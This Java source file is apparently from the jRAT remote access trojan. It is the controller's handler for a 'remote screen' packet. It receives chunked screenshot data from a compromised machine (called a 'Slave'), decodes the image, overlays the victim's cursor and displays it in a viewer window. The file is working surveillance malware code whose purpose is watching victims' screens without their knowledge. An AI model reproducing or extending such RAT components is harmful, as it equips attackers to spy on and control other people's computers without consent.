package pro.jrat.client.packets.incoming;

import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.FileOutputStream;

import pro.jrat.client.Cursor;
import pro.jrat.client.Slave;
import pro.jrat.client.ui.frames.FrameRemoteScreen;
import pro.jrat.client.utils.ImageUtils;

public class Packet17RemoteScreen extends AbstractIncomingPacket {
	
	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		FrameRemoteScreen frame = FrameRemoteScreen.instances.get(slave);
		
		int x = dis.readInt();
		int y = dis.readInt();
		
		int length = dis.readInt();
				
		if (frame != null) {
			ByteArrayOutputStream baos = new ByteArrayOutputStream();

			int read = 0;
			int chunkSize;
			
			frame.getProgressBar().setMaximum(length);

			while ((chunkSize = dis.readInt()) != -1) {
				byte[] chunk = new byte[chunkSize];

				read += chunkSize;

				dis.readFully(chunk);

				baos.write(chunk);
				
				frame.getProgressBar().setValue(read);
			}
			
			byte[] array = baos.toByteArray();
						
			BufferedImage image = ImageUtils.decodeImage(array);
			Cursor.drawCursor(slave.getOS(), image.createGraphics(), x, y);
			image.getGraphics().dispose();
			
			frame.update(image);
			
		} else {
			dis.readFully(new byte[length]);
			dis.readInt();
			dis.readInt();
		}
	}
}
